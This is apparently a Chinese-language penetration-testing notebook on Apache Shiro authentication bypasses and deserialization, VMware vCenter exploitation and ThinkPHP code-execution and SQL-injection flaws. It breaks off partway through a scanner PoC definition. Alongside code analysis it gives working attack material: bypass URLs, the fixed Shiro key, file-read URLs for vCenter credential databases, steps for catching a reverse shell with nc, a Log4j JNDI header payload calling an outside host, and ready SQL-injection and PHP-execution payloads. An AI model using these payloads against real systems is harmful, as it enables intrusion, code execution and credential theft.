# Learn

Shiro
 - CVE-2010-3863:
   Shiro < 1.1.0
   JSecurity 0.9.X
   在getPathWithinApplication中调用getRequestUri方法获取Uri,没有对路径进行标准化处理,导致可以绕过权限认证。

   [users]
   zhang=123,admin
   wang=123,admin,vip
   每一行定义一个用户, 格式是 username = password, role1, role2, ..., roleN
    ​
    [roles]
    admin=user:delete
    角色在这里定义, 格式是 roleName = perm1, perm2, ..., permN
    说明1: 权限名可以使用带有层次的命名方式, 使用冒号来分割层次关系, 比如 user:create 或 user:poweruser:update 权限.
    //说明2: user:* 这样的权限, 代表具有 user:create 和 user:poweruser:update 权限.
    ​
   [urls]
   /static/**=anon
   /login=anon
   /authc/admin/user/delete=perms["user:delete"]
   /authc/admin/user/create=perms["user:create"]
   /authc/admin/**=roles[admin]
   /authc/home=roles[admin,vip]
   /authc/**=authc
   
   绕过：
    http://127.0.0.1//authc/admin
    http://127.0.0.1/./authc/admin
    http://127.0.0.1/xxx/../authc/admin

 - CVE-2016-6802:
   Shiro < 1.3.2
   getContextPath方法中未标准化路径，该漏洞允许攻击者通过利用非根 Servlet 上下文路径，绕过预期的 Servlet 过滤器，从而获取访问权限。
   http://127.0.0.1/xxxx/../admin/index.jsp

 - CVE-2020-1957:
   Shiro < 1.5.2
   spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问
   chainDefinition.addPathDefinition("/logout", "logout");
   chainDefinition.addPathDefinition("/admin/**", "authc");
   http://127.0.0.1/admin/
   http://127.0.0.1/xxx/..;/admin/

 - CVE-2020-13933:
   Shiro < 1.6.0
   Apache Shiro 1.5.3之前的版本，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过
   http://127.0.0.1/;/admin/
   http://127.0.0.1/admin/xx
 - CVE-2020-17510:
   Shiro < 1.7.0
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%2e
 - CVE-2020-17523:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2021-41303:
   Shiro < 1.7.1
   当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过
   http://127.0.0.1/admin/%20
 - CVE-2022-32532
   Shiro < 1.9.1



   Shiro 550 漏洞分析：漏洞的原理是shiro版本<=1.2.24的版本中使用了固定的密钥kPH+bIxk5D2deZiIxcaaaA==，这样攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码

package org.apache.shiro.mgt;
AbstractRememberMeManager.java

```
public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
        //清除之前的认证
        forgetIdentity(subject);
    //保存新的认证
    //如果勾选了记住我就进入记住认证的函数
    if (isRememberMe(token)) {
        rememberIdentity(subject, token, info);
    } else {
        if (log.isDebugEnabled()) {
            log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
                    "RememberMe functionality will not be executed for corresponding account.");
        }
    }
}
```

```
public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
     //获取认证的信息
     PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);
    //保存认证的信息
     rememberIdentity(subject, principals);
}
```

```
protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
    byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
    rememberSerializedIdentity(subject, bytes);
}
```

```
protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
    //重点 序列化认证信息
    byte[] bytes = serialize(principals);
    if (getCipherService() != null) {
        bytes = encrypt(bytes);
    }
    return bytes;
}
```

```
protected byte[] encrypt(byte[] serialized) {
    byte[] value = serialized;
    //获取加密类
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        //加密，AES/CBC/PKCS5Padding
        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
        value = byteSource.getBytes();
    }
    return value;
}
```

```
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {

	if (!WebUtils.isHttp(subject)) {
        if (log.isDebugEnabled()) {
            String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
                    "request and response in order to set the rememberMe cookie. Returning immediately and " +
                   "ignoring rememberMe operation.";
            log.debug(msg);
        }
        return;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(subject);
    HttpServletResponse response = WebUtils.getHttpResponse(subject);

    //base 64 encode it and store as a cookie:
    String base64 = Base64.encodeToString(serialized);

    Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
    Cookie cookie = new SimpleCookie(template);
    cookie.setValue(base64);
    cookie.saveTo(request, response);
}
```

反序列化



```
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
    try {
        byte[] bytes = getRememberedSerializedIdentity(subjectContext);
        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
        if (bytes != null && bytes.length > 0) {
            principals = convertBytesToPrincipals(bytes, subjectContext);
        }
    } catch (RuntimeException re) {
        principals = onRememberedPrincipalFailure(re, subjectContext);
    }

    return principals;
}
```

```
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

    if (!WebUtils.isHttp(subjectContext)) {
        if (log.isDebugEnabled()) {
            String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                    "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                    "immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }
        return null;
    }

    WebSubjectContext wsc = (WebSubjectContext) subjectContext;
    if (isIdentityRemoved(wsc)) {
        return null;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(wsc);
    HttpServletResponse response = WebUtils.getHttpResponse(wsc);

    String base64 = getCookie().readValue(request, response);
    // Browsers do not always remove cookies immediately (SHIRO-183)
    // ignore cookies that are scheduled for removal
    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

    if (base64 != null) {
        base64 = ensurePadding(base64);
        if (log.isTraceEnabled()) {
           log.trace("Acquired Base64 encoded identity [" + base64 + "]");
        }
        byte[] decoded = Base64.decode(base64);
        if (log.isTraceEnabled()) {
            log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
        }
        return decoded;
    } else {
        //no cookie set - new site visitor?
        return null;
    }
}
```



```
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (getCipherService() != null) {
        bytes = decrypt(bytes);
    }
    //漏洞点
    return deserialize(bytes);
}
```



```
protected byte[] decrypt(byte[] encrypted) {
    byte[] serialized = encrypted;
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
        serialized = byteSource.getBytes();
    }
    return serialized;
}
```



Shiro 721漏洞分析

Apapche Shiro RememberMe Cookie 默认通过 AES-128-CBC 模式加密 ，这种加密模式容易受到 Padding Oracle Attack( Oracle 填充攻击 )，攻击者可以使用有效的 RememberMe Cookie 作为 Paddding Oracle Attack 的前缀，然后精心构造 RememberMe Cookie 来实施反序列化攻击。

Padding Oracle Attack

使用任意账户登陆目标网站，以获取一个合法的 RememberMe Cookie

将获取的值作为POA的前缀

加密反序列化的payload来构造恶意RememberMe Cookie

将构造好的恶意数据填充到 RememberMe Cookie 字段中并发送

**满足条件**：

1. 获取密文和IV

2. 能够出发服务器解密，并且解密失败和成功，响应有差异

   

   

https://www.jianshu.com/p/833582b2f560

#### 1. 分组密码的填充

常用的对称算法，如3DES、AES在加密时一般采用分组密码（Block Cipher），将明文进行分组，如常见的64bit、128bit、256bit。
 分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。常用的填充操作有PKCS#5和PKCS#7，在最后一个block中将不足的bit位数作为bit值进行填充，例如最后一个分组（block）缺少3个bit，就填充3个0x03到结尾，缺少n个bit，就填充n个0x0n。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。

![img](https://upload-images.jianshu.io/upload_images/2087924-bed86f68ae4aab66.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp)

####  2.CBC模式密码算法



![img](https://upload-images.jianshu.io/upload_images/2087924-91de3d2bfac81090.png?imageMogr2/auto-orient/strip|imageView2/2/w/600/format/webp)

```php
1. 明文经过填充后，分为不同的组block，以组的方式对数据进行处理 
2. 初始化向量（IV）首先和第一组明文进行XOR（异或）操作，得到”中间值“
3. 采用密钥对中间值进行块加密，删除第一组加密的密文 （加密过程涉及复杂的变换、移位等） 
4. 第一组加密的密文作为第二组的初始向量（IV），参与第二组明文的异或操作  
5. 依次执行块加密，最后将每一块的密文拼接成密文  
```

![img](https://upload-images.jianshu.io/upload_images/2087924-29a85b8f10e0e508.png?imageMogr2/auto-orient/strip|imageView2/2/w/600/format/webp)

```undefined
1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文
2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  
3. 将中间值和初始化向量进行异或，得到该组的明文
4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文
5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）
6. 校验通过得到明文，校验失败得到密文 
```



现在让我们来看看在不知道明文的情况下，如何猜解处明文。首先我们将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据：

```undefined
初始化向量： 7B  21  6A  63  49  51  17  0F
第一组密文： F8  51  D6  CC  68  FC  95  37
第二组密文： 85  87  95  A2  8E  D4  AA  C6
```

将初始化向量全部设置为0，服务器势必会解密失败，返回HTTP 500，那是因为在对数据进行解密的时候，明文最后一个字节的填充是Ox3D,不满足填充规则，校验失败，此时示意图如下：

![img](https://upload-images.jianshu.io/upload_images/2087924-65ec7d2db092f3d5.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

依次将初始化向量最后一个字节从0x01~0xFF递增，直到解密的明文最后一个字节为0x01，成为一个正确的padding，当初始化向量为000000000000003C时，成功了，服务器返回HTTP 200，解密示意图如下

![img](https://upload-images.jianshu.io/upload_images/2087924-6d05d2a6649b4928.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)

我们已知构造成功的IV最后一个字节为0x3C，最后一个填充字符为0x01，则我们能通过异或XOR计算出，第一组密文解密后的中间值最后一个字节：0x01 xor 0x3C = 0x3D;
 **重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值得最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值**



通过CBC字节翻转攻击，假如我们能够触发加解密过程，并且能够获得每次加密后的密文。那么我们就能够在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，而且只能从最后一组开始修改，并且每改完一组，都需要重新获取一次解密后的数据，要根据解密后的数据来修改前一组密文的值。









# Vcenter系列漏洞检测利用

攻防流程:

1、判断vcenter版本

2、扫描是否存在相关漏洞

3、低权限-提权-高权限

4、ldap添加用户、伪造cookie获取web后台权限 # 获取管理员cookie https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%976-vCenter-SAML-Certificates

5、获取后台锁屏机器权限

vcenter版本获取  /sdk/vimServiceVersions.xml

存储关键身份验证信息数据位置：
Linux:/storage/db/vmware-vmdir/data.mdb
Windows：C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```
一、 CVE-2021-21972 – 未授权远程代码执行（vSphere Client 插件）
1.漏洞描述

CVE-2021-21972 vmware vcenter的一个未授权的命令执行漏洞。该漏洞可以上传一个webshell至vcenter服务器的任意位置，然后执行webshell即可。

vSphere Client（HTML5）在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。在 CVE-2021-21972 VMware vCenter Server 远程代码漏洞 中，攻击者可直接通过443端口构造恶意请求，执行任意代码，控制vCenter。

2.受影响版本及漏洞评级

VMware vCenter Server 7.0系列 < 7.0.U1c

VMware vCenter Server 6.7系列 < 6.7.U3l

VMware vCenter Server 6.5系列 < 6.5 U3n

3.复现
title="+ ID_VC_Welcome +"

访问未授权接口/ui/vropspluginui/rest/services/updateova
如果页面返回状态码为200、405，则可能存在漏洞

https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py（POC）
https://github.com/NS-Sp4ce/CVE-2021-21972/blob/main/CVE-2021-21972.py（EXP）
```

```
二、 CVE-2021-21980 任意文件读取漏洞
1.影响范围
vCenter Server 6.7
vCenter Server 6.5
Cloud Foundation (vCenter Server) 3.x
2.漏洞利用
可读取postgresql数据库配置文件
http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
直接读取data.mdb文件，提取cookie，登录后台
https://x.x.x.x/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb

```

```
三、CVE-2021-21985 – vSAN 插件远程代码执行
1.描述
vSphere Client（HTML5）中的 vSAN Health Check 插件存在远程代码执行漏洞，攻击者可调用未授权方法执行代码。
2.影响版本
VMware vCenter Server 7.0系列 < 7.0.U2b
VMware vCenter Server 6.7系列 < 6.7.U3n
VMware vCenter Server 6.5系列 < 6.5 U3p
VMware Cloud Foundation 4.x 系列 < 4.2.1
VMware Cloud Foundation 4.x 系列 < 3.10.2.1
出网利用
工具链接：
https://github.com/xnianq/cve-2021-21985_exp
用法如下：
在vps
java -jar JNDIInjection-Bypass.jar 1099 <监听port>
2、在vps
nc接收反弹shell
nc -lvvp <监听port> 
3、攻击机：
python cve-2021-21985_exp.py
条件：
需要目标出网
如果目标不出网，可以尝试研究下原理，打个内存马。
不出网利用
具体原理：
利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。
https://github.com/alt3kx/CVE-2021-21985_PoC?tab=readme-ov-file
```
```
四、 CVE-2021-22005 – 任意文件上传导致远程代码执行

1.漏洞描述
VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。2021年9月22日，VMware 官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。
2.漏洞影响
针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞
VMware vCenter Server 7.0系列 < 7.0 U2c
VMware vCenter Server 6.7系列 < 6.7 U3o
VMware vCenter Server 6.5系列 不受漏洞影响
其余漏洞受影响版本可参考 
https://www.vmware.com/security/advisories/VMSA-2021-0020.html
安全版本：
VMware vCenter Server 7.0 U2c
VMware vCenter Server 6.7 U3o
3.复现
curl -k -v "https://$VCENTER_HOST/analytics/telemetry/ph/api/level?_c=test"
•如果服务器以 200/OK 和响应正文中除“OFF”以外的任何内容（例如“FULL”）进行响应，则它很容易受到攻击

https://github.com/shmilylty/cve-2021-22005-exp 只能linux版的
https://github.com/CrackerCat/CVE-2021-22006
```

```
五、CVE-2021-44228 Log4j
xff header jndi注入内存马
漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面

GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: 192.168.121.137
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close


DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。  直接注入内存马
```


# thinkphp漏洞总结
一、thinkphp 2.x/3.0 远程代码代码执行漏洞
   
   原因：
	Dispatcher.class.php中res参数中使用了preg_replace的/e危险参数，使得preg_replace第二个参数就会被当做php代码执行，导致存在一个代码执行漏洞，攻击者可以利用构造的恶意URL执行任意PHP代码。
   
   分析：
   	漏洞存在在文件 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php 中，ThinkPHP 2.x版本中使用preg_replace的/e模式匹配路由，我们都知道，preg_replace的/e模式，和php双引号都能导致代码执行的，即漏洞触发点在102行的解析url路径的preg_replace函数中。代码如下：

```php
        if(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
            $paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
            $var  =  array();
            if (C('APP_GROUP_LIST') && !isset($_GET[C('VAR_GROUP')])){
                $var[C('VAR_GROUP')] = in_array(strtolower($paths[0]),explode(',',strtolower(C('APP_GROUP_LIST'))))? array_shift($paths) : '';
                if(C('APP_GROUP_DENY') && in_array(strtolower($var[C('VAR_GROUP')]),explode(',',strtolower(C('APP_GROUP_DENY'))))) {
                    // 禁止直接访问分组
                    exit;
                }
            }
            if(!isset($_GET[C('VAR_MODULE')])) {// 还没有定义模块名称
                $var[C('VAR_MODULE')]  =   array_shift($paths);
            }
            $var[C('VAR_ACTION')]  =   array_shift($paths);
            // 解析剩余的URL参数
            $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
            $_GET   =  array_merge($var,$_GET);
        }
```

该代码块首先检测路由规则，如果没有制定规则则按照默认规则进行URL调度，在preg_replace()函数中，正则表达式中使用了/e模式，将“替换字符串”作为PHP代码求值，并用其结果来替换所搜索的字符串。
正则表达式可以简化为“\w+/([\^\/])”，即搜索获取“/”前后的两个参数，$var[‘\1’]=”\2”;是对数组的操作，将之前搜索到的第一个值作为新数组的键，将第二个值作为新数组的值，我们发现可以构造搜索到的第二个值，即可执行任意PHP代码，在PHP中，我们可以使用${}里面可以执行函数，然后我们在thinkphp的url中的偶数位置使用${}格式的php代码，即可最终执行thinkphp任意代码执行漏洞，如下所示：

index.php?s=a/b/c/${code}

index.php?s=a/b/c/${code}/d/e/f

index.php?s=a/b/c/d/e/${code}

由于ThinkPHP存在两种路由规则，如下所示：

1. http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]

   如果不支持PATHINFO的服务器可以使用兼容模式访问如下：

2. http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]

3. 也可采用 index.php/a/b/c/${code}一下形式。

   

示例过程如下：
假设有这样一个 URL 路径：index.php?s=/blog/read/id/123/type/456
我们先假设 $depr = '/'，这是路径分隔符。
执行前的变量状态：
```
$paths = ['id', '123', 'type', '456'];
$paramStr = implode($depr, $paths); // 得到 "id/123/type/456"
```
现在来看这句关键代码：
```
$res = preg_replace('@(\w+)' . $depr . '([^' . $depr . '/]+)@e', '$var[\'\\1\']="\\2";', $paramStr);
```
 等效于

```
   $res = preg_replace('@(\w+)/([^/]+)@e', '$var[\'\\1\']="\\2";', 'id/123/type/article');
```

正则表达式分析：

```
@(\w+)/([^/]+)@e
```

这个正则表达式逐对匹配 key/value：

```
	(\w+)：匹配键（例如 id, type）

    /：匹配中间的分隔符

    ([^/]+)：匹配值（不含 /，例如 123, 456）
```

匹配结果：
1.

```
id/123
    \1 = id

    \2 = 123
```

2.

```
type/456

    \1 = type

    \2 = 456
```

   替换字符串
   ```$var[\'\\1\']="\\2";```
   每次匹配的替换结果是：

```
$var['id']="123";
$var['type']="456";
```

因为php中双引号都能导致代码执行的，所以 index.php?s=a/b/c/${code}  
相当于$var['c']="${code}";  => index.php?s=a/b/c/${@phpinfo()}   =>  $var['c']="${@phpinfo()} ";  最后phpinfo();会被执行

 POC:

	index.php?s=a/b/c/${code}
	
	index.php?s=a/b/c/${code}/d/e/f
	 
	index.php?s=a/b/c/d/e/${code}
	 
	也可采用 index.php/a/b/c/${code}一下形式。

二、ThinkPHP <=3.2.4 SQL注入漏洞（CNVD-2018-21504）

原因：

ThinkPHP 3.2.4版本中的Library/Think/Db/Driver.class.php文件的‘parseOrder’函数存在SQL注入漏洞，该漏洞源于程序错误地处理了变量key。远程攻击者可借助‘order’参数利用该漏洞执行任意的SQL命令。

分析：

在ThinkPHP <=3.2.4时，如果使用了order 查询

```
public function orderbySql()
{
    $user = M('user'); // 实例化 user 表对应的模型
    $data = array();
    $data['username'] = array('eq', 'admin'); // 查询条件：username = 'admin'
    $order = I('get.order');  // 获取 GET 参数中的 'order' 值
    $m = $user->where($data)->order($order)->find(); // 执行查询
} 
```

在Library/Think/Db/Driver.class.php文件的‘parseOrder’函数存在SQL注入漏洞

```
	protected function parseOrder($order)
	{
		echo "<pre>";
		echo "输入参数:\n";
		var_dump($order);

		if (is_array($order)) {
			$array = array();
			foreach ($order as $key => $val) {
				echo "处理键："; var_dump($key);
				echo "处理值："; var_dump($val);
				
				if (is_numeric($key)) {
					$parsed = $this->parseKey($val);
					echo "解析字段：" . $parsed . "\n";
					$array[] = $parsed;
				} else {
					$parsed = $this->parseKey($key);
					echo "解析字段：$parsed $val\n";
					$array[] = $parsed . ' ' . $val;
				}
			}
			$order = implode(',', $array);
			echo "最终拼接："; var_dump($order);
		}

		echo "</pre>";
		return !empty($order) ? ' ORDER BY ' . $order : '';
	}
```

```
    protected function parseKey(&$key)
    {
        $key = trim($key);
        if (!is_numeric($key) && !preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
            $key = '`' . $key . '`';
        }
        return $key;
    }
```



如果URL如下：

```
index.php/Home/Index/orderbySql?order[updatexml(1,concat(0x3a,user()),1)]=
或者
index.php/Home/Index/orderbySql?order[]=updatexml(1,concat(0x3a,user()),1)
```

SQL语句为:

```
SELECT * FROM `think_user` ORDER BY `updatexml(1,concat(0x3a,user()),1)`  LIMIT 1
```

```
SELECT * FROM `think_user` ORDER BY updatexml(1,concat(0x3a,user()),1)  LIMIT 1

```

```
调试输出结果如下
index.php/Home/Index/orderbySql?order[]=updatexml(1,concat(0x3a,user()),1)
输入参数:
array(1) {
  [0]=>
  string(34) "updatexml(1,concat(0x3a,user()),1)"
}
处理键：int(0)
处理值：string(34) "updatexml(1,concat(0x3a,user()),1)"
解析字段：updatexml(1,concat(0x3a,user()),1)
最终拼接：string(34) "updatexml(1,concat(0x3a,user()),1)"

index.php/Home/Index/orderbySql?order[updatexml(1,concat(0x3a,user()),1)]=
输入参数:
array(1) {
  ["updatexml(1,concat(0x3a,user()),1)"]=>
  string(0) ""
}
处理键：string(34) "updatexml(1,concat(0x3a,user()),1)"
处理值：string(0) ""
解析字段：updatexml(1,concat(0x3a,user()),1) 
最终拼接：string(35) "updatexml(1,concat(0x3a,user()),1) "

http://localhost/thinkphp-3.2.3/index.php/Home/Index/orderbySql?order[account]=
输入参数:
array(1) {
  ["account"]=>
  string(0) ""
}
处理键：string(7) "account"
处理值：string(0) ""
解析字段：`account` 
最终拼接：string(10) "`account` "
执行的SQL语句：
SELECT * FROM `think_user` ORDER BY `account`  LIMIT 1  
```
三、ThinkPHP <=3.2.4 SQL注入漏洞（CNVD-2018-21507）

http://localhost/thinkphp-3.2.3/index.php/Home/Index/cntSql?amount=id),updatexml(1,concat(1,user(),1),1)from+user%23

demo代码

```
public function cntSql()
{
    $amount = I('get.amount');
    $num = M('user')->count($amount);
    dump($num);
    // 输出 SQL 语句
    echo "<pre>执行的SQL语句：\n";
    echo $user->getLastSql();
    echo "</pre>";
}
```

M('user')->count($amount); 触发到了 

```
/**
     * 利用__call方法实现一些特殊的Model方法
     * @access public
     * @param string $method 方法名称
     * @param array $args 调用参数
     * @return mixed
     */
    public function __call($method, $args)
    {
		echo "<pre>调试输出：\n";
		echo var_dump($method);
		echo var_dump($args);
		echo "</pre>";
        if (in_array(strtolower($method), $this->methods, true)) {
            // 连贯操作的实现
            $this->options[strtolower($method)] = $args[0];
            return $this;
        } elseif (in_array(strtolower($method), array('count', 'sum', 'min', 'max', 'avg'), true)) {
            // 统计查询的实现
            $field = isset($args[0]) ? $args[0] : '*';
            return $this->getField(strtoupper($method) . '(' . $field . ') AS tp_' . $method);
        } elseif (strtolower(substr($method, 0, 5)) == 'getby') {
            // 根据某个字段获取记录
            $field         = parse_name(substr($method, 5));
            $where[$field] = $args[0];
            return $this->where($where)->find();
        } elseif (strtolower(substr($method, 0, 10)) == 'getfieldby') {
            // 根据某个字段获取记录的某个值
            $name         = parse_name(substr($method, 10));
            $where[$name] = $args[0];
            return $this->where($where)->getField($args[1]);
        } elseif (isset($this->_scope[$method])) {
// 命名范围的单独调用支持
            return $this->scope($method, $args[0]);
        } else {
            E(__CLASS__ . ':' . $method . L('_METHOD_NOT_EXIST_'));
            return;
        }
    }
```

```
elseif (in_array(strtolower($method), array('count', 'sum', 'min', 'max', 'avg'), true)) {
            // 统计查询的实现
            $field = isset($args[0]) ? $args[0] : '*';
            return $this->getField(strtoupper($method) . '(' . $field . ') AS tp_' . $method);
}
这里已经拼接了sql语句进去了，然后通过$this->getField('count(id),updatexml(1,concat(1,user(),1),1)from user#) AS tp_count')

调试输出：
string(5) "count"
array(1) {
  [0]=>
  string(47) "id),updatexml(1,concat(1,user(),1),1)from user#"
}
```



http://localhost/thinkphp-3.2.3/index.php/Home/Index/cntSql?amount=id),updatexml(1,concat(1,user(),1),1)from+think_user%23

```
调试输出：
string(5) "count"
array(1) {
  [0]=>
  string(53) "id),updatexml(1,concat(1,user(),1),1)from think_user#"
}
初始传入的 fields: string(72) "COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count" 字段是字符串，进行 explode: array(6) { [0]=> string(9) "COUNT(id)" [1]=> string(11) "updatexml(1" [2]=> string(8) "concat(1" [3]=> string(6) "user()" [4]=> string(2) "1)" [5]=> string(31) "1)from think_user#) AS tp_count" } 字段是数组，开始解析: 普通字段：COUNT(id) 普通字段：updatexml(1 普通字段：concat(1 普通字段：user() 普通字段：1) 普通字段：1)from think_user#) AS tp_count 最终拼接结果: string(72) "COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count"
输入参数:
string(0) ""
:(

1105:XPATH syntax error: 'root@localhost1' [ SQL语句 ] : SELECT COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count FROM `think_user`
```

四、ThinkPHP <= 3.1.3 SQL注入漏洞（CNVD-2018-09389）（CVE-2018-10225）

描述：



thinkphp 3.1.3版本中存在SQL注入漏洞。远程攻击者可借助‘s’参数向index.php文件发送特制的SQL语句利用该漏洞查看、添加、更改或删除后端数据库中的信息。



```
detail:
  ID: 662
  Author: 匿名作者
  Name: ThinkPHP框架index.php s参数-SQL注入(CVE-2018-10225)
  Description: "【漏洞对象】ThinkPHP\n【涉及版本】ThinkPHP 3.1.3\n【漏洞描述】\nthinkphp是一个免费开源的，快速、简单的面向对象的轻量级PHP高性能开发框架，该框架index.php文件s参数存在sql盲注，可造成数据泄露，甚至服务器被入侵。"
  Identifier:
    CVE: CVE-2018-10225
    DVB: DVB-2021-662
  Cvss:
    Score: '9.8'
    Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  VulnClass:
  - SQL注入
  Category:
  - 应用服务
  Manufacturer: 上海顶想
  Product: ThinkPHP
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  Risk: 2
  DisclosureDate: '2018-04-19'
  AddDate: '2021-01-19'
  UpdateDate: '2024-12-24'
  VulnImpact: 黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。
  Is0day: false
  Expertmodel: false
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: true
  IsCallBack: false
  Condition: header="thinkphp" || header="think_template"
  Solutions:
  - 1.在网页代码中需要对用户输入的数据进行严格过滤。
  - 2.部署Web应用防火墙，对数据库操作进行监控。
  - 3.升级至最新版本：<a href="http://www.thinkphp.cn/down.html" target="_blank">http://www.thinkphp.cn/down.html</a
  Sources:
  - https://github.com/cflq3/poc/blob/b6eea1312c0c40972b703d3825ee40aa680cf9c6/bugscan/exp-1833.py
  PluginType: yaml
  Finger:
  - Manufacturer: 上海顶想
    Product: ThinkPHP
    ProductDescription: ''
    Category: 应用服务
    Type: 1
    Condition: header="thinkphp" || header="think_template"
    IsXc: false
    Region: ''
poc:
  relative: req0&&req1
  session: true
  requests:
  - method: POST
    timeout: 10
    path: /index.php?s=/home/user/checkcode/
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/59.0.3034.103 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    data: "----------641902708\nContent-Disposition: form-data; name=\"couponid\"\n\
      \n1') union select sleep(5)#\n----------641902708--"
    follow_redirects: true
    matches: (code.eq("200") && time.egt("5"))
  - method: POST
    timeout: 10
    path: /index.php?s=/home/user/checkcode/
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/59.0.843.71 Safari/537.36
